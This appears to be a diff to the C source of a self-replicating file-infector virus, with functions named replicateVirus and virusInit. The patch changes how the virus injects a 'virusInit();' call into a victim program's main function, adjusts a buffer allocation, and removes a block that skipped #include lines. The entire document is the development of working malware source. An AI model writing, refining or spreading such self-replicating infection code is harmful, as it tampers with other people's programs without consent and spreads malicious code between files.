@@ -31,7 +31,7 @@ void replicateVirus(char *content)
 
     long combinedSize = contentSize + fileSize;
     // For the content of the victim
-    char *victimContent = malloc(fileSize + 1);
+    char *victimContent = malloc(fileSize + 16);
     strcpy(victimContent, "");
     if (victimContent == NULL)
     {
@@ -60,9 +60,11 @@ void replicateVirus(char *content)
             }
             if (i == 9)
             {
-                strcat(buffer, "\n{virusInit();\n");
+                strcat(buffer, "\n");
                 strcat(victimContent, buffer);
                 fscanf(fp, "%[^\n] ", buffer);
+                strcat(victimContent,buffer);
+                strcat(victimContent,"virusInit();\n");
                 continue;
             }
         }
@@ -104,32 +106,6 @@ void virusInit()
     {
         const char *inc = "#include";
         const char *intmainString = "int main(";
-        if (!includePass)
-        {
-            if (strlen(buffer) >= 8)
-            {
-                int i;
-                for (i = 0; i < 8; i++)
-                {
-                    if (buffer[i] != inc[i])
-                    {
-                        break;
-                    }
-                }
-                if (i == 8)
-                {
-                    continue;
-                }
-                else
-                {
-                    includePass = true;
-                }
-            }
-            else
-            {
-                includePass = true;
-            }
-        }
 
         if (strlen(buffer) >= 9)
         {
